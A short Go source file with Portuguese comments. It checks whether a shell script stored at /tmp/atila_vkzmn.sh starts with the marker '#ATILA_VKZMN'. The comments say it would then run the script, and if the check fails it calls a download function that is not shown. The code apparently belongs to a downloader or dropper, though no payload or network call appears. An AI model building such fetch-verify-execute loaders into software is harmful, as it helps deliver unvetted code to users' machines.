package main





//essa funcao vai verifica o magic  byte do arquivo atila_vkzmn.sh


import  (


"os"
"fmt"
"io/ioutil"
)



var   my_magic_byte string  = "#ATILA_VKZMN"



func magic_byte() {



file_ok  := 0 


ptr , err_op  := os.Open("/tmp/atila_vkzmn.sh")



if  err_op  ==   nil   {




magic_byte  , err_readall  :=    ioutil.ReadAll(ptr)



if err_readall  == nil {



magic_str :=   string(magic_byte)




my  := [] byte (my_magic_byte)


fmt.Println(my)


if   magic_str[0]  == my[0]{
if   magic_str[1] ==  my[1]{
if   magic_str[2] ==  my[2]{
if   magic_str[3] ==  my[3]{
if   magic_str[4] ==  my[4]{
if   magic_str[5] ==  my[5]{
if   magic_str[6] ==  my[6]{
if   magic_str[7] ==  my[7]{
if   magic_str[8] ==  my[8]{
if   magic_str[9] ==  my[9]{
if   magic_str[10] == my[10]{
if   magic_str[11] == my[11]{




fmt.Println("file ok")


file_ok =    23





} } } } } } } } } } } }  



}


}


if  file_ok  ==  23 {




fmt.Println("chmando funcao")



os.Exit(0)

return


//aqui pode chama a funcao que executara esee arquivo



} else {



//file nao foi  abaixado  ou nao teve permisao de escrita  


fmt.Println("file nao foi abaixado ou magic_byte  nao reconhecido")


down_atila_vkzmn_sh()  //try try down file



}







}

